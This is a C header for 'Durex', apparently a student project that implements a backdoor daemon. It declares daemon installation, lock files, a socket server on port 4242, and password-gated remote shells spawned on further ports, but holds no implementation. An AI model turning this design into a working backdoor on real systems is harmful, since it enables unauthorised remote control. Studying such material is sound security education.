#ifndef DUREX_H
# define DUREX_H

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <pwd.h>

# define BOOLEAN int

typedef enum		e_bool
{
	true = 1,
	false = 0
}					t_bool;

#define PORT       			4242
#define MAX_CLIENT			3
#define MAX_SHELLS			3 * 3
#define SHELL_START_PORT	4243

#define HELP "Durex v1.0: Available command:\nhelp\nshell\nquit\n"

typedef struct			s_client
{
	pthread_t			thread;
	BOOLEAN				used;
	int					socket;
	int					shell_port;
	char				*token;
	int					shell_pid;
}						t_client;

typedef struct			s_durex
{
	t_client			clients[MAX_CLIENT];
	int					socket;
	char				*program_path;
	int					shell_ports[MAX_SHELLS];
	BOOLEAN				shell_ports_used[MAX_SHELLS];
}						t_durex;

/*
** UTILS
*/
char			*ft_strnew(size_t size);
BOOLEAN			file_exists(const char *filename);
BOOLEAN			is_directory(const char *filename);
char			*file_get_contents(const char *filename);
size_t			file_get_contents_size(char **content, const char *filename);
BOOLEAN			file_put_contents(const char *filename, const char *content);
BOOLEAN			file_put_contents_size(const char *filename, const char *content, size_t size);
size_t			array_length(char **array);
void			free_array(char **array);
char			*file_base_name(const char *file_path);
char			*file_absolute_path(const char *file_path);
char			**ft_split_string(char const *s, char *c);
char			*ft_dstrjoin(char *s1, char *s2, short flag);
/*
** PROCESSES EXISTS
*/
BOOLEAN			processes_exists(char **names);
int				processes_exists_pid(char **names);
/*
** SOCKET SERVER
*/
int				new_socket_server(int port);
void			socket_server_handler(t_durex *durex);
/*
** CLIENT
*/
void			new_client(t_client *client);
int				client_slot(void);
/*
** SIGNALS
*/
void			signal_child_handler(int sig);
void			signal_all_handler(int sig);
/*
** SHELL
*/
int				durex_shell(int port);
BOOLEAN			new_durex_shell(t_durex *durex, t_client *client);
/*
** DUREX
*/
int				durex_daemon(char *program_path);
t_durex			*get_durex(void);
void			destruct_durex(t_durex *durex);
/*
** passwrd
*/
BOOLEAN 		compare_passwrd(char *no_crypted_passwrd);
char			*gen_passwrd(char *key);
/*
** PROGRAM
*/
int				main(int argc, char **argv);
void			daemon_install(void);
void			daemon_create_lock(void);
void			daemon_remove_lock(void);

#endif
